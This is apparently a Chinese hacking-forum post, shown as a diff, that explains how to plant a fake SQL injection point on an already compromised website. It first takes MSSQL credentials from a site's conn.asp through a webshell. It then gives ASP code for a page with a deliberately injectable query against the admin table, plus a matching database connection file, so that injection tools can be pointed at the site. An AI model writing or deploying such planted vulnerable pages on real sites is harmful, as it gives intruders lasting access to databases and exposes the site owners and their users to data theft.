@@ -1,0 +1,43 @@
+ 自己构造注入点方便入侵
+
+今天看了rootkit论坛里面有人要我写出来关于伪造一个注入点，然后方便渗透，找到更多的可利用的信息
+
+这两天一直考试，想了下，就先仍出来，有什么问题可以提出来，我们一起讨论！
+
+首先你要拿了一个webshell，这样你找到连接数据库的文件，大多都是conn.asp这个文件里面有mssql的用户和
+
+密码，你要找到用户名、密码、数据库所在的IP，然后连接上去，至于连接大家应该都会，找到网站管理员的表
+
+因为我测试的时候是用管理员的表，我朋友说任何表名都可以，只要这个表存在，代码如下：
+
+程序代码
+<!--#include file="xx.asp"-->
+<%
+set rs=server.createobject("ADODB.recordset")
+id = request("id")
+strSQL = "select * from admin where id=" & id
+rs.open strSQL,conn,1,3
+rs.close
+%>
+
+把strSQL = "select * from admin where id=" & id 这句话里面的admin换成要伪造的表名，注意必须存在
+
+你可以连接上去看下表名就是了！这里假设的是admin是表名！这个文件名随便保存！
+
+然后就要构造一个连接数据库的文件了，代码如下：
+程序代码
+<%        
+strSQLServerName = "000.000.000.000"     '服务器名称或地址
+strSQLDBUserName = "sqlname"         '数据库帐号
+strSQLDBPassword = "sqlpass"         '数据库密码
+strSQLDBName = "sqldataname"           '数据库名称
+Set conn = Server.CreateObject("ADODB.Connection")
+strCon = "Provider=SQLOLEDB.1;Persist Security Info=False;Server=" & strSQLServerName & ";User ID=" & strSQLDBUserName & ";Password=" & strSQLDBPassword & ";Database=" & strSQLDBName & ";"
+conn.open strCon
+%>
+
+这里应该都会了，就不罗嗦了，不过注意的是保存的文件名要和include调用的名字一样。。还是罗嗦话，
+
+就这样，正常情况下，就OK了，伪造成功……
+
+           如果有什么问题可以提出来大家一起探讨解决。
